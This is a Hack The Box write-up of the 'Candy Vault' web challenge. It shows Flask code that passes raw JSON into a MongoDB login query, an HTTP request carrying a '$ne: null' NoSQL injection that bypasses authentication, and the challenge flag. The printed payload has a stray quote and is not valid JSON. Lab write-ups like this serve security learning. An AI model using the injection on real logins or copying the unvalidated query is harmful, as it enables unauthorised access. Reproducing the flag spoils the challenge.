---
title: Candy Vault
date: 2025-01-31
author: Flavien
draft: false
tags:
  - CTF
  - HTB
  - Challenge
  - Web
  - Veasy
  - NoSQL
categories:
  - Writeup
  - Challenge
  - Web
description: HTB writeup for the very easy web challenge "Candy Vault"
summary: A concise walkthrough of the very easy Hack The Box challenge "Candy vault". Use
---
```
The malevolent spirits have concealed all the Halloween treats within their secret vault, and it's imperative that you decipher its enigmatic seal to reclaim the candy before the spooky night arrives.
```

==> For this challenge we get a url as well as the source code, and going to the website we are met by a single login page. --> checking the source code we see this:

```python
from flask import Flask, Blueprint, render_template, redirect, jsonify, request
from flask_bcrypt import Bcrypt
from pymongo import MongoClient

app = Flask(__name__)
app.config.from_object("application.config.Config")
bcrypt = Bcrypt(app)

client = MongoClient(app.config["MONGO_URI"])
db = client[app.config["DB_NAME"]]
users_collection = db["users"]

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, "description") else [str(x) for x in error.args]
    
    response = {
        "error": {
            "type": error.__class__.__name__,
            "message": message
        }
    }

    return response, error.code if hasattr(error, "code") else 500


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    content_type = request.headers.get("Content-Type")

    if content_type == "application/x-www-form-urlencoded":
        email = request.form.get("email")
        password = request.form.get("password")

    elif content_type == "application/json":
        data = request.get_json()
        email = data.get("email")
        password = data.get("password")
    
    else:
        return jsonify({"error": "Unsupported Content-Type"}), 400

    user = users_collection.find_one({"email": email, "password": password})

    if user:
        return render_template("candy.html", flag=open("flag.txt").read())
    else:
        return redirect("/")
```

where we see that it is using a `MongoDB`database and checking if we are found before logging us in and displaying the flag -->it is vulnerable to a `NoSQL`injection!! (See [this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) for payloads)

==> We can capture the request in `BurpSuite`and send a request to get the flag:

```http
POST /login HTTP/1.1
Host: 94.237.50.242:42794
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 57
Origin: http://94.237.50.242:42794
Connection: keep-alive
Referer: http://94.237.50.242:42794/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{
	"email":{"$ne": null},
	"password":{"$ne":null"}
}
```

which logs us in and gets us the flag:

==> **`HTB{s4y_h1_t0_th3_c4andy_v4u1t!}`**